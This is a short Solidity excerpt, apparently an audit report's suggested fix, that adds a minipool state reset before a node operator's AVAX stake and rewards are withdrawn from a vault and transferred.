                uint256 avaxNodeOpAmt = getUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxNodeOpAmt")));
                uint256 avaxNodeOpRewardAmt = getUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxNodeOpRewardAmt")));
                uint256 totalAvaxAmt = avaxNodeOpAmt + avaxNodeOpRewardAmt;

                Staking staking = Staking(getContractAddress("Staking"));
                staking.decreaseAVAXStake(owner, avaxNodeOpAmt);
               resetMinipoolData(minipoolIndex); // FIX - add this here

                Vault vault = Vault(getContractAddress("Vault"));
                vault.withdrawAVAX(totalAvaxAmt);
                owner.safeTransferETH(totalAvaxAmt);
        }
```
